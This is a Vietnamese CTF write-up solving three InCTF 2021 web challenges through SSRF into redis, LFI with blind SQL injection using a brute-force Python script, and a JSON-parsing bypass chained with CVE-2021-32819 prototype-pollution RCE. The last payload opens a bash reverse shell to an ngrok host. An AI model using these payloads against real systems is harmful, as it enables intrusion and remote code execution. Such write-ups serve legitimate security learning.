# INCTF2021_web_writeup
---
## Raas
- Từ file docker, biết được source code nằm ở /code và 2 file main.py và app.py, tải file về bằng payload:
``` file://web.challenge.bi0s.in:6969/code/app.py ```

- Yêu cầu là set '_isAdmin' thành "yes", chuỗi '_isAdmin' sẽ được nối vào sau uid của người dùng => key có dạng uid+'_isAdmin', value='false'
- Ngoài ra ta được một gợi ý là sử dụng 'inctf://redis:6379/_get', thử đổi get thành set, payload:
``` inctf://redis:6379/_set {uid}_isAdmin yes ```
---
## Vuln Drive
- /source để lấy source code -> /dev-test -> ssrf
- Nhưng hàm 'url_validate(url)' Chặn các payload thông thường
``` 
def url_validate(url):
    blacklist = ["::1", "::"]
    for i in blacklist:
        if(i in url):
            return "NO hacking this time ({- _ -})"
    y = urlparse(url)
    hostname = y.hostname
    try:
        ip = socket.gethostbyname(hostname)
    except:
        ip = ""
    print(url, hostname,ip)
    ips = ip.split('.')
    if ips[0] in ['127', '0']:
        return "NO hacking this time ({- _ -})"
    else:
        try:
            url = unquote(url)          #  <==
            r = requests.get(url,allow_redirects = False)
            return r.text
        except:
            print(url, hostname)
            return "cannot get you url :)"
```
- Từ chức năng upload -> lfi /etc/hosts -> 1 đường dẫn khác
- Sử dụng đường dẫn đó để ssrf -> 1 trang php
```
<?php
include('./conf.php');
$inp=$_GET['part1'];
$real_inp=$_GET['part2'];
if(preg_match('/[a-zA-Z]|\\\|\'|\"/i', $inp)) exit("Correct <!-- Not really -->");
if(preg_match('/\(|\)|\*|\\\|\/|\'|\;|\"|\-|\#/i', $real_inp)) exit("Are you me");
$inp=urldecode($inp);
//$query1=select name,path from adminfo;
$query2="SELECT * FROM accounts where id=1 and password='".$inp."'";
$query3="SELECT ".$real_inp.",name FROM accounts where name='tester'";
$check=mysqli_query($con,$query2);
if(!$_GET['part1'] && !$_GET['part2'])
{
    highlight_file(__file__);
    die();
}
if($check || !(strlen($_GET['part2'])<124))
{
    echo $query2."<br>";
    echo "Not this way<br>";
}
else
{
    $result=mysqli_query($con,$query3);
    $row=mysqli_fetch_assoc($result);
    if($row['name']==="tester")
        echo "Success";
    else
        echo "Not";
    //$err=mysqli_error($con);
    //echo $err;
}
?>
```
- SQLi!!! Phân tích code, cần làm query2 trả về sai và lợi dụng query3 để blind sqli(vì kết quả cuối cùng chỉ trả về cho ta Not hay Success)
- Vì part1 đã chặn hết alphabet và kí tự ```'``` -> Sử dụng urlencode: 0x252527 - ```__'```
- Phần part2, được gợi ý từ comment -> flag có thể nằm trong bảng adminfo.
- Payload:
```http://192.168.96.2/part1=0x252527&part2=path,name FROM adminfo WHERE path like 0x25{}25 UNION SELETE 1```
- solve.py:
```
import requests
import string
url="http://web.challenge.bi0s.in:6006/login"
url2="http://web.challenge.bi0s.in:6006/return-files?f="
url1="http://web.challenge.bi0s.in:6006/dev_test"
def login():
  r = requests.post(url,data={'username':'admin','password':'1337'}, allow_redirects = False)
  newcookie= r.cookies['session']
  return newcookie
patt=""
payload=""
dem=0
newcookie=login()
print(newcookie)
while 1:
  dem=dem+1
  print(dem)
  for i in "/" + string.ascii_letters + string.digits:
    data1={"url":"http://192.168.96.2?part1=%252527&part2=path,name from adminfo where path like 0x25{}25 Union select password".format((payload+i).encode('utf-8').hex())}
    r =requests.post(url1,data=data1,cookies={"session":""+newcookie})
    #print(r.text)
    if "Not" in r.text:
      payload=payload + i
      print("+[flag]= ",payload)
      r3=requests.get(url2+payload, cookies={"session":""+newcookie})
      print(r3.text)
      break
```
- Vì bị giới hạn độ dài nên tên file sẽ không được in ra hết (27 kí tự). Thêm 1 phần nhỏ sau chuỗi ra nhận được để lấy tiếp phần tiếp theo của file
- LFI file đó => flag: ```inctf{y0u_pr0v3d_th4t_1t_i5_n0t_53cur3_7765626861636b6572}```
---
## Json Analyser
1. Lấy mã PIN:
```
@app.route('/verify_roles',methods=['GET','POST'])
def verify_roles():
    no_hecking=None
    role=request.args.get('role')
    if "superuser" in role:
        role=role.replace("superuser",'')
    if " " in role:
        return "n0 H3ck1ng"
    if len(role)>30:
        return "invalid role"
    data='"name":"user","role":"{0}"'.format(role)
    no_hecking=re.search(r'"role":"(.*?)"',data).group(1)
    if(no_hecking)==None:
        return "bad data :("
    if no_hecking == "superuser":
        return "n0 H3ck1ng"
    data='{'+data+'}'
    try:
        user_data=ujson.loads(data)
    except:
        return "bad format" 
    role=user_data['role']
    user=user_data['name']
    if (user == "admin" and role == "superuser"):
        return os.getenv('subscription_code')
    else:
        return "no subscription for you"
```
- Yêu cầu: làm data có dạng {"name":"admin","role":"superuser"}
- ```supersuperuseruser``` để bypass replace
- ```supersuperuseruser\ud888``` để bypass ujson.load, tham khảo: [https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities]
- ```supersuperuseruser\ud888","name":"admin``` để đổi user thành admin và cũng là payload để lấy PIN
2. Upload File
 ```
 app.post('/upload', function(req, res) {
    let uploadFile;
    let uploadPath;
    if(req.body.pin !== "[REDACTED]"){
        return res.send('bad pin')
    }
    if (!req.files || Object.keys(req.files).length === 0) {
      return res.status(400).send('No files were uploaded.');
    }
    uploadFile = req.files.uploadFile;
    uploadPath = __dirname + '/package.json' ;
    uploadFile.mv(uploadPath, function(err) {
        if (err)
            return res.status(500).send(err);
        try{
        	var config = require('config-handler')();
        }
        catch(e){
            const src = "package1.json";
            const dest = "package.json";
            fs.copyFile(src, dest, (error) => {
                if (error) {
                    console.error(error);
                    return;
                }
                console.log("Copied Successfully!");
            });
        	return res.sendFile(__dirname+'/static/error.html')
        }
        var output='\n';
        if(config['name']){
            output=output+'Package name is:'+config['name']+'\n\n';
        }
        if(config['version']){
            output=output+ "version is :"+ config['version']+'\n\n'
        }
        if(config['author']){
            output=output+"Author of package:"+config['author']+'\n\n'
        }
        if(config['license']){
            var link=''
            if(config['license']==='ISC'){
                link='https://opensource.org/licenses/ISC'+'\n\n'
            }
            if(config['license']==='MIT'){
                link='https://www.opensource.org/licenses/mit-license.php'+'\n\n'
            }
            if(config['license']==='Apache-2.0'){
                link='https://opensource.org/licenses/apache2.0.php'+'\n\n'
            }
            if(link==''){
                var link='https://opensource.org/licenses/'+'\n\n'
            }
            output=output+'license :'+config['license']+'\n\n'+'find more details here :'+link;
        }
        if(config['dependencies']){
            output=output+"following dependencies are thier corresponding versions are used:" +'\n\n'+'     '+JSON.stringify(config['dependencies'])+'\n'
        }

        const src = "package1.json";
        const dest = "package.json";
        fs.copyFile(src, dest, (error) => {
            if (error) {
                console.error(error);
                return;
            }
        });
        res.render('index.squirrelly', {'output':output})
    });
});
```
- Yêu cầu: Gửi file JSON có thể RCE -> sử dụng "__proto__" để excute code
- Sử dụng CVE-2021-32819, tham khảo: https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/
- payload: 
```
{"dependencies": 
  {
    "test":"aaaa",
    "__proto__":{"defaultFilter":"e'));process.mainModule.require('child_process').execSync('/bin/bash -c \"/bin/bash -i >& /dev/tcp/4.tcp.ngrok.io/16542 0>&1\"').toString()//"}
  }
}
```
- Sử dụng dependencies vì code sử dụng ```JSON.stringify(config['dependencies'])``` để phân tích các json con bên trong
- "__proto__" để excute code
- "defaultFilter":"e'));" dự vào CVE-2021-32819 để thực thi code bên phải dấu ;
- Phần code sao là reverse shell về ngrok, ngoài ra có thể curl hoặc các cách khác để rce
- ![image](https://user-images.githubusercontent.com/58381595/129514687-6e8c170f-8811-494d-881e-da6be4171220.png)
